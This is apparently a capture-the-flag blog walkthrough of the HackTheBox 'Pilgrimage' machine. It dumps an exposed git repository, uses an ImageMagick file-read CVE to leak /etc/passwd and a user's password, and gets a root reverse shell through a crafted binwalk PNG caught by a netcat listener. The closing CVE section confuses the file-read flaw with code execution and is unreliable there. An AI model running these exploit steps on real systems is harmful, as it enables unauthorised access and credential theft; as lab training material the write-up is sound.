---
layout: post
title: "HTB: Pilgrimage"
author: Andrew Cherney
date: 2023-11-25 16:42:58
tags: htb easy-box linux webapp upload-bypass cve
icon: "assets/icons/pilgrimage.png"
post_description: "If bypassing image upload restrictions is your favorite activity then look no further than this box. After tEXt-ing your way into the machine pspy64 can find a file which is vulnerable to a CVE that can be exploited gain a root shell."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Pilgrimage]
└──╼ $nmap -A -sC pilgrimage.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-23 11:28 CDT
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
echo "10.10.11.219 pilgrimage.htb" >> /etc/hosts
```

<h2>Port 80 - http</h2>

![Front page](/img/pilgrimage/pilgrimage_front_page.png)

We are greeted with an image upload and shrinking service. We can login, view our dashboard, and upload images to downscale. 

![Login page](/img/pilgrimage/pilgrimage_login_page.png)

![Dashboard](/img/pilgrimage/pilgrimage_dashboard.png)

In the process of uploading an image it places it the upload on your dashboard with a forcible `.png` and random string for a name. Intercepted WebKitForm below:

```
------WebKitFormBoundaryAi7NXu9LUfYPpM0z

Content-Disposition: form-data; name="toConvert"; filename="pilgrimage_dashboard.png"

Content-Type: image/png
```

I tried fumbling around with different file upload types and inserting xml with an svg but whatever code lies on this machine is sanitizing and forcibly changing the extension and name. 

<h2>git</h2>

now we can turn our heads to the `.git` directory. A common trend of these lazily placed git directories is their permissions are properly set only for directories, and that is sort of by design. But we can still use a tool like `git-dumper` to extract every file there and reconstruct any mentioned file. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Pilgrimage]
└──╼ $bash GitTools/Dumper/gitdumper.sh http://pilgrimage.htb/.git/ git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Pilgrimage/dumpedgit]
└──╼ $cat COMMIT_EDITMSG 
Pilgrimage image shrinking service initial commit.
# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# Author:    emily <emily@pilgrimage.htb>
#
# On branch master
#
# Initial commit
#
# Changes to be committed:
#	new file:   assets/bulletproof.php
#	new file:   assets/css/animate.css
#	new file:   assets/css/custom.css
#	new file:   assets/css/flex-slider.css
#	new file:   assets/css/fontawesome.css
...
```

<h1>User as emily</h1>

<h2>Magick</h2>

I look in the initial commit and see some things: `bulletproof.php`, `magick`, and `index.php`. Also the user is emily that we are going to gain access to.

bulletproof is for safe image upload, magick is for the shrinking, `index.php` is below.

```php
<?php
session_start();
require_once "assets/bulletproof.php";

function isAuthenticated() {
  return json_encode(isset($_SESSION['user']));
}

function returnUsername() {
  return "\"" . $_SESSION['user'] . "\"";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
```

There is an important database reference in the index: `sqlite:/var/db/pilgrimage`. 

Onto magick now. Magick is a tool and with all tools has different versions and use cases.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Pilgrimage]
└──╼ $chmod +x magick 
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Pilgrimage]
└──╼ $./magick -h
Error: Invalid argument or not enough arguments

Usage: magick tool [ {option} | {image} ... ] {output_image}
Usage: magick [ {option} | {image} ... ] {output_image}
       magick [ {option} | {image} ... ] -script {filename} [ {script_args} ...]
       magick -help | -version | -usage | -list {option}
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Pilgrimage]
└──╼ $./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

<h2>tEXt</h2>

That beta version is vulnerable [to an arbitrary file read with tEXt](https://www.exploit-db.com/exploits/51261). This exploit extracts some data through a raw profile within the png. 

```bash
git clone https://github.com/voidz0r/CVE-2022-44268
cargo run "/etc/passwd"
identify -verbose uploadedimage.png
```

```
Image: ../etcpasswd.png
  Format: PNG (Portable Network Graphics)
  Geometry: 100x100
  Class: PseudoClass
  Type: palette
  Depth: 1 bits-per-pixel component
  Channel Depths:
    Red:      1 bits
    Green:    1 bits
    Blue:     1 bits
  Channel Statistics:
    Red:
      Minimum:                 65535.00 (1.0000)
      Maximum:                 65535.00 (1.0000)
      Mean:                    65535.00 (1.0000)
      Standard Deviation:          0.00 (0.0000)
    Green:
      Minimum:                     0.00 (0.0000)
      Maximum:                     0.00 (0.0000)
      Mean:                        0.00 (0.0000)
      Standard Deviation:          0.00 (0.0000)
    Blue:
      Minimum:                     0.00 (0.0000)
      Maximum:                     0.00 (0.0000)
      Mean:                        0.00 (0.0000)
      Standard Deviation:          0.00 (0.0000)
  Colors: 2
    0: (255,  0,  0)	  red
    1: (255,255,255)	  white
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Filesize: 1.1Ki
  Interlace: No
  Orientation: Unknown
  Background Color: #FEFEFE
  Border Color: #DFDFDF
  Matte Color: #BDBDBD
  Page geometry: 100x100+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 3
  Png:IHDR.bit-depth-orig: 1
  Raw profile type: 

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a

  Date:create: 2023-07-23T18:21:49+00:00
  Date:modify: 2023-07-23T18:21:49+00:00
  Date:timestamp: 2023-07-23T18:21:49+00:00
  Signature: c7d03a3453434db9720fd67b559185125d9bdb1fe9c25c182783170e2ba6a8f6
  Tainted: False
  Elapsed Time: 0m:0.000883s
  Pixels Per Second: 10.8Mi
```

```bash
cat file | xargs | sed 's/ //g'
python3 -c 'print(bytes.fromhex("726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a"))'
b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n'
```

And bingo local file reading capabilities. Now we can grab that database at `/var/db/pilgrimage` and search for emily to find her password. ```emily : abigchonkyboi123```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Pilgrimage/CVE-2022-44268]
└──╼ $ssh emily@pilgrimage.htb
emily@pilgrimage.htb's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 23 09:26:59 2023 from 10.10.14.2
emily@pilgrimage:~$ cat user.txt 
5d328a9790175d------------------
```

<h1>Root</h1>

<h2>pspy64</h2>

```
2023/07/24 05:22:26 CMD: UID=0     PID=723    | /bin/bash /usr/sbin/malwarescan.sh 
```

When running my normal enum I came across this bash script run as root through pspy. 

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

<h2>binwalk</h2>

Uses binwalk in script.

```bash
emily@pilgrimage:~$ binwalk -h

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
```

[This creates a payload image that starts a reverse shell](https://www.exploit-db.com/exploits/51249).

```bash
emily@pilgrimage:/tmp$ python3 raccoon.py id_rsa.png 10.10.14.10 7777

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.

emily@pilgrimage:/tmp$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/binwalk.png
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Pilgrimage]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.219] 45294
ls
_binwalk.png.extracted
whoami
root
cd /root
cat root.txt
37203ce6d565--------------------
```

<h1>CVE Dive</h1>

<h3>CVE-2022-44268: Arbitrary Remote Leak</h3>

tEXt chunks are used to define metadata, properties, and comments. Magick will erase all chunks flagged as `Comment`, then override the date, software, and Thumb metadata, and keep all other tEXt values. From here you can define any property and place a php payload to run what you want.

```php
$imgck = new Imagick($input);
$imgck->setImageProperty("trashcans", $_payload);
$imgck->writeImage($output);
```

The exploit script forces the payload of a reverse shell. This technique is quite interesting and I will have to keep it and other image upload tests I did during this box in mind. 

<h3>CVE-2022-4510 Path traversal in binwalk</h3>

The core of this exploit relies on `os.path.join` which allows for a directory traversal to extract load and execute malicious plugins and run any code desired. The fix to this was the follows: to change `os.path.join(out_dir, entry.fname)` to `os.path.abspath(os.path.join(out_dir, entry.fname))` which removes the potential to escape the defined directory.
